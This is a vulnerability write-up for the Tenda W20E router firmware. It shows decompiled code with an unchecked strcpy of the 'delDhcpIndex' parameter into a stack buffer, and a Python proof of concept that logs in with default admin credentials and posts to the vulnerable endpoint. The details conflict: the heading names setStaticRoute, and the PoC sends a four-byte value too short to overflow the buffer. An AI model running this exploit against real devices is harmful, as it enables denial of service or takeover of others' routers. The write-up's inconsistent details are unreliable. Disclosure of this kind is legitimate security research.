# Tenda W20E

### version

```
V15.11.0.6 （US_W20EV4.0br_V15.11.0.6（1068_1546_841）_CN_TDC）
```

### Firmware

```
https://www.tenda.com.cn/download/detail-2707.html
```



## setStaticRoute

### detail

In function formDelDhcpRule,the content obtained by the program from the parameter "delDhcpIndex" is passed to indexSet.Then the indexSet is directly copied into the indexs stack through the strcpy function.There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.

```c
void __cdecl formDelDhcpRule(webs_t wp, unsigned __int8 *path, unsigned __int8 *query)
{
  int v3; // r0
  unsigned __int8 msg[32]; // [sp+14h] [bp-A8h] BYREF
  unsigned __int8 indexs[128]; // [sp+34h] [bp-88h] BYREF
  unsigned __int8 *indexSet; // [sp+B4h] [bp-8h]

  indexSet = 0;
  memset(indexs, 0, sizeof(indexs));
  *(_DWORD *)msg = 0;
  *(_DWORD *)&msg[4] = 0;
  *(_DWORD *)&msg[8] = 0;
  *(_DWORD *)&msg[12] = 0;
  *(_DWORD *)&msg[16] = 0;
  *(_DWORD *)&msg[20] = 0;
  *(_DWORD *)&msg[24] = 0;
  *(_DWORD *)&msg[28] = 0;
  indexSet = websGetVar(wp, "delDhcpIndex", "0");
  strcpy((char *)indexs, (const char *)indexSet);
  delete_rules_in_list("dhcps.static.list", indexs, "\t");
  if ( CommitCfm(v3) )
  {
    sprintf((char *)msg, "module_id=%d,op=%d", 3, 6);
    send_msg_to_netctrl(3, msg);
  }
  outputToWebs(wp, "1");
}
```



### poc

```python
import requests

cmd  = b'delDhcpIndex=' + b'1000' 


url = b"http://192.168.0.1/login/Auth"
payload = b"http://192.168.0.1/goform/delDhcpRules/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

